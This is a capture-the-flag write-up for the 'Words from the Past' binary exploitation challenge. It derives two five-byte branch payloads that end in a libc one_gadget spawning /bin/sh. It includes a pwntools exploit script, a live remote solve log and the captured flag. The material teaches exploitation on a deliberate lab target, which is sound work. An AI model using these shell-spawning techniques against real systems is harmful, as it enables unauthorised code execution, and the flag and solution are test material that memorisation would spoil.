# Words from the Past — Writeup

## The short version

This challenge does not give us a normal buffer overflow. Instead, it gives us
two chances to submit **exactly five bytes of machine code**:

1. The first five bytes must begin with a `call` instruction.
2. The second five bytes must begin with a `jmp` instruction.

We use the first instruction to call `main()` again. The second run places our
next instruction close enough to libc that we can jump directly to a
`one_gadget`, which starts `/bin/sh`.

The only unknown is three bits from the process ID, so the remote exploit simply
tries the eight possible values on fresh connections.

The exploit was run successfully against the live challenge and obtained:

```text
HTB{f1v3_byt3s_0f_pr3c1s10n_t0 rul3_th3m_4ll_11aa4118ee4cd2c62d41e23868aea1e5}
```

---

## Files and protections

The supplied files were:

```text
Dockerfile
challenge/
├── glibc/
│   ├── ld-linux-x86-64.so.2
│   └── libc.so.6
└── words_from_the_past
```

Running `checksec` gives:

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

That looks intimidating at first: the executable and libc are randomized, the
stack is not executable, GOT overwrites are blocked, and stack smashing is
protected. Fortunately, none of those protections are the intended target.
The program creates its own executable memory for us.

The binary is stripped, but it is small enough to understand with `objdump`,
Ghidra, or another disassembler:

```bash
objdump -d -Mintel challenge/words_from_the_past
```

---

## What the program actually does

Ignoring the artwork and anti-debugging distractions, the important logic is
roughly:

```c
print_banner();

if (first_run)
    fork_once();

if (phase == 0) {
    address = main + 0x10000;
    expected_opcode = 0xe8;       // call rel32
    phase = 1;
} else {
    libc_base = find_libc_in_proc_maps();
    gap = (0x1000 + (getpid() & 7)) << 12;
    address = libc_base - gap;
    expected_opcode = 0xe9;       // jmp rel32
}

code = mmap(address, 0x1000, RWX, ...);
read(0, code, 5);

validate_the_five_bytes(code, expected_opcode);

rbx = 0;
rcx = 0;
r12 = 0xdead;
rax = 1;
rsp &= ~0xf;
jump_to(code);
```

The validation checks that:

- All five bytes were received.
- None of the five bytes is `NULL`.
- None is a newline.
- None is `0xcc`, the `int3` breakpoint opcode.
- The first phase begins with `0xe8`.
- The second phase begins with `0xe9`.

Both `call rel32` and `jmp rel32` are exactly five bytes:

```text
opcode | signed 32-bit relative displacement
 1 byte|                 4 bytes
```

This is the big hint. The program is not asking us to squeeze useful shellcode
into five bytes. It wants us to use one relative branch to reach existing code.

---

## Stage one: call `main()` again

The first `mmap()` receives this hint:

```text
main + 0x10000
```

`main()` is at PIE offset `0x16d5`, so the hint is:

```text
PIE base + 0x116d5
```

Memory mappings must begin on page boundaries. Linux therefore rounds this
down to:

```text
PIE base + 0x11000
```

The address of the instruction after our five-byte `call` will be:

```text
PIE base + 0x11005
```

We want the call target to be:

```text
PIE base + 0x16d5
```

The PIE base cancels out when calculating a relative displacement:

```text
displacement = target - next_instruction
             = 0x16d5 - 0x11005
             = -0xf930
```

Packed as a signed little-endian 32-bit value, `-0xf930` is:

```text
d0 06 ff ff
```

Our complete first stage is consequently:

```text
e8 d0 06 ff ff
```

In pwntools:

```python
stage1 = b"\xe8" + p32((-0xf930) & 0xffffffff)
```

This calls `main()` recursively. The global phase variable has already been
changed, so the recursive invocation takes the second branch.

Using a real `call` also fixes the normal x86-64 function-entry stack alignment:
it pushes an eight-byte return address before entering `main()`.

---

## Stage two: jump into libc

On the recursive run, the program reads `/proc/self/maps` and finds the base
address of its bundled libc. It then creates another executable page at:

```text
mapping = libc_base - distance
```

where:

```text
distance = (0x1000 + (getpid() & 7)) << 12
```

This looks strange, but it is helpful. The mapping and libc move together, so a
relative jump between them does not need a libc leak. ASLR again cancels out.

### Choosing the destination

The supplied libc is Ubuntu glibc 2.39. Running:

```bash
one_gadget challenge/glibc/libc.so.6
```

finds a useful gadget at offset `0x583f3`. It uses `posix_spawn()` to start
`/bin/sh`. Its important constraints include:

```text
rsp is 16-byte aligned
rcx == NULL
rbx == NULL
```

Conveniently, the challenge explicitly clears `rbx` and `rcx`, makes the stack
writable and aligned, and then jumps to our instruction. This is a very strong
sign that this particular gadget is intended.

The target is:

```text
target = libc_base + 0x583f3
```

The second instruction is a five-byte jump, so its displacement is:

```text
displacement = target - (mapping + 5)

             = (libc_base + 0x583f3)
               - (libc_base - distance + 5)

             = distance + 0x583f3 - 5
```

If `k = getpid() & 7`, this becomes:

```text
displacement = 0x10583ee + (k << 12)
```

The second stage is therefore:

```python
def stage2(k):
    distance = (0x1000 + k) << 12
    displacement = distance + 0x583f3 - 5
    return b"\xe9" + p32(displacement)
```

All eight possible encodings pass the program's bad-byte checks.

---

## Dealing with the process ID

Only `getpid() & 7` matters, so there are eight possible values.

For a local process, we can obtain the PID of the challenge's forked child from:

```text
/proc/<parent pid>/task/<parent pid>/children
```

On the remote service, the PID is not disclosed. Trying all eight possibilities
is cheap, so the exploit changes its guess on each fresh connection. The script
allows 32 attempts to tolerate PID changes caused by `socat`, the challenge's
own `fork()`, or other connections reaching the server at the same time.

This is not password brute-forcing or a huge search. We are guessing only three
bits.

---

## Final exploit

The exploit is saved as [`solve.py`](./solve.py). Its core is:

```python
from pwn import *

HINT = b"Precise moves, keep it fast and lethal..\n"
MARKER = b"__WFTP_SHELL__"

stage1 = b"\xe8" + p32((-0xf930) & 0xffffffff)
one_gadget = 0x583f3


def stage2(pid_low_bits):
    distance = (0x1000 + pid_low_bits) << 12
    displacement = distance + one_gadget - 5
    return b"\xe9" + p32(displacement)


def exploit(io, pid_low_bits):
    io.recvuntil(HINT)
    io.send(stage1)

    # The old invocation prints once before executing stage one, and recursive
    # main prints the banner again before accepting stage two.
    io.recvuntil(HINT)
    io.recvuntil(HINT)

    io.send(stage2(pid_low_bits))
    io.sendline(b"echo " + MARKER)

    return MARKER in io.recvuntil(MARKER, timeout=3)
```

The complete version also handles local PID discovery, remote retries, flag
collection, and interactive shell access.

---

## Running it

Local:

```bash
./solve.py
```

Remote:

```bash
./solve.py REMOTE HOST=<challenge-host> PORT=<challenge-port>
```

When the PID guess is correct, execution reaches the libc gadget and
`posix_spawn()` launches `/bin/sh`.

### Live solve

For the provided instance, the command was:

```bash
python3 solve.py REMOTE HOST=154.57.164.78 PORT=30668
```

The first sixteen connections used incorrect PID guesses. On attempt 17, the
guess `getpid() & 7 == 0` matched:

```text
[*] attempt 17: guessing getpid() & 7 == 0
[+] shell obtained with PID low bits 0
[*] Switching to interactive mode

HTB{f1v3_byt3s_0f_pr3c1s10n_t0 rul3_th3m_4ll_11aa4118ee4cd2c62d41e23868aea1e5}
```

The retries are expected rather than a sign that the exploit is broken. Every
connection receives a new process, and the second relative jump depends on the
lowest three bits of that process's PID.

---

## Why this was a fun one

The challenge initially looks like it gives us almost nothing: five filtered
bytes, full modern mitigations, PIE, ASLR, anti-debugging, and no address leak.
The trick is that relative branches care only about the **distance** between two
addresses.

The program deliberately puts our first mapping near the PIE binary and the
second mapping near libc. Once those distances are calculated, all the random
base addresses disappear from the equations. Five bytes are exactly enough.
